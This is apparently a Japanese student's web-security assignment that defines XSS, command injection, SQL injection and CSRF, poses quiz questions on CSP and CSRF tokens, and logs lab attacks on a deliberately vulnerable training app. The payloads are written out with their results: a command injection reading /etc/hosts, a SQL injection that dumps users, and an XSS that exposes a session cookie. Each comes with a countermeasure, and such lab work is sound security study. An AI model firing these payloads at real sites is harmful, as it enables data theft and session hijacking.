# 課題 1

### XSS

ユーザからの入力内容に応じて HTML コンテンツを生成する 動的 Web アプリケーションに対して悪意のある JavaScript を埋め込む攻撃。

#### 被害

- Cookie に埋め込まれたセッション情報などの秘密情報を、悪意のあるサイトの管理者に盗まれる。
- フォームに入力された秘密データを盗まれる。
- 偽のログイン画面を表示することで、利用者の ID/パスワードやクレジットカード番号が盗まれる。

#### 対処法

入力内容のエスケープ処理等を適切に行い、スクリプトを無効化する。

### コマンドインジェクション

サーバーで動くアプリケーション内で コマンドラインを動的に組み立てる実装がある際に、フォームから送られてきた文字列をそのままコマンドラインとして実行してしまうことでファイルの破壊など想定していない動作をさせてしまう攻撃。

#### 被害

サーバー内に保管してある情報の漏洩/破壊/改竄

#### 対処法

そもそもコマンドを動的に組み立てて実行するような処理を実装しないことと、パラメータを適切にエスケープすること。

### SQL インジェクション

サーバ側で SQL を動的に組み立てて実行する実装がある場合に、フォームなどから送られた内容をそのまま SQL 文として実行してしまい、データベースを不正に操作されてしまう攻撃。

#### 被害

データベース内の情報の流出/破壊/改竄

#### 対処法

SQL を実行する処理を実装する際は、パラメータとして受け取る文字列を適切にエスケープすることや、フレームワークの機能で賄える場合は無闇に生 SQL を書かないこと。

### CSRF

ユーザーに対して、攻撃者が用意した悪意のあるリンクを踏ませることで、そのユーザーがログインしている別の Web サービスに対して意図しないリクエストを送らせる攻撃。

#### 被害

- プロフィールなどの意図しない変更
- SNS などへの意図しない書き込み
- 情報の流出

#### 対処法

トークンなどの照合情報を用いて、ユーザーが意図して送信したリクエストか/第三者から不正に送られたリクエスト出ないかどうか、をサーバー側で検証する。

# 課題 2

- コンテンツセキュリティポリシー (CSP)の設定に際して用いられる HTTP ヘッダはなんでしょうか？

- 上記ヘッダがサポートされていないブラウザで代わりに有効なヘッダをひとつ挙げてください。

- CSRF の対策ではワンタイムトークンが用いられることが多いですが、その理由を簡単に説明してください。

# 課題 3

- コマンドインジェクション

実行

```
; less /etc/hosts
```

結果

```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	619c367b7eed
```

対策

フォームから受け取る値を適切にエスケープさせる。

- SQL インジェクション

実行

```
1' or 'a'='a
```

結果

```
ID: 1' or 'a'='a
First name: admin
Surname: admin
ID: 1' or 'a'='a
First name: Gordon
Surname: Brown
ID: 1' or 'a'='a
First name: Hack
Surname: Me
ID: 1' or 'a'='a
First name: Pablo
Surname: Picasso
ID: 1' or 'a'='a
First name: Bob
Surname: Smith
```

対策

プリペアドステートメントを用いるようにする。

- CSRF

実行

csrf.html を作成。フォームに適当な値(test,test)を入力して送信。

結果

```
Password Changed.
```

対策

フォームに hidden 属性でワンタイムトークンを埋め込んでおく。

- XSS

実行

以下のスクリプトをフォームに埋め込み送信します

```
<script>alert(document.cookie)</script>
```

結果

以下のような内容とともにアラートが表示されます(クッキー情報が取得できてしまっている)

参考: https://www.youtube.com/watch?v=qHHADT52L5s

```
PHPSESSID=tphoiep7ns5n9t4amv193m2761; security=low
```

対策
入力値を適切にエスケープする。
cookie に httpOnly 属性をつけるのも有効。

参考: https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies#restrict_access_to_cookies
